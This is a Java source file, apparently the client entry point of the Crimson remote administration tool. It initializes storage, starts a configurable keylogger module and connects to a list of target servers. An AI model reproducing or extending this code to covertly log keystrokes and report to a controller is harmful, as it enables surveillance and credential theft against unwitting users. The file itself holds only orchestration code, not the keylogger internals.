/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.awt.HeadlessException;
import java.io.File;
import java.io.IOException;
import java.sql.SQLException;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.net.ClientConnectionStore;
import com.subterranean_security.crimson.client.store.ConfigStore;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
import com.subterranean_security.crimson.core.misc.EH;
import com.subterranean_security.crimson.core.storage.BasicDatabase;
import com.subterranean_security.crimson.core.storage.StorageFacility;
import com.subterranean_security.crimson.core.util.LogUtil;
import com.subterranean_security.crimson.core.util.Native;
import com.subterranean_security.crimson.universal.Universal.Instance;
import com.subterranean_security.crimson.universal.stores.DatabaseStore;
import com.subterranean_security.crimson.universal.stores.PrefStore;

public class Client {
	private static final Logger log = LoggerFactory.getLogger(Client.class);

	public static void main(String[] args) {

		LogUtil.configure();

		log.info("Initializing client");

		// Establish the custom fallback exception handler
		Thread.setDefaultUncaughtExceptionHandler(new EH());

		// Establish the custom shutdown hook
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Initialize preference storage
		initializePreferences();

		// Check for other instances
		if (PrefStore.getPref().isLocked()) {
			System.exit(0);
		} else {
			PrefStore.getPref().lock();
		}

		// Load native libraries
		Native.Loader.load();

		// Initialize database
		initializeDatabase();

		ConfigStore.loadConfig();

		try {
			Common.cvid = DatabaseStore.getDatabase().getInteger("cvid");
		} catch (Exception e2) {
		}

		log.debug("CVID: {}", Common.cvid);

		// Initialize connection stores
		ClientConnectionStore.initialize();

		if (ConfigStore.getConfig().getKeylogger()) {
			try {
				Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
						ConfigStore.getConfig().getKeyloggerFlushValue());
			} catch (HeadlessException e) {
				// ignore
			} catch (Exception e) {
				log.error("Failed to start keylogger: {}", e.getMessage());
				e.printStackTrace();
			}
		}

		ClientConnectionStore.setTargets(ConfigStore.getConfig().getTargetList());
		ClientConnectionStore.connectionRoutine();

	}

	private static void initializeDatabase() {
		StorageFacility sf = new BasicDatabase(Client.class.getName(),
				new File(Common.Directories.base + "/var/client.db"));
		try {
			sf.initialize();
		} catch (ClassNotFoundException e) {
			log.error("Failed to load SQLite dependancy");
			System.exit(0);
		} catch (IOException e) {
			log.error("Failed to write database");
			System.exit(0);
		} catch (SQLException e) {
			log.error("SQL error: {}", e.getMessage());
			System.exit(0);
		}

		DatabaseStore.setFacility(sf);
	}

	private static void initializePreferences() {
		PrefStore.loadPreferences(Instance.CLIENT);
	}

	public static AuthenticationGroup getGroup() {
		try {
			return (AuthenticationGroup) DatabaseStore.getDatabase().getObject("auth.group");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
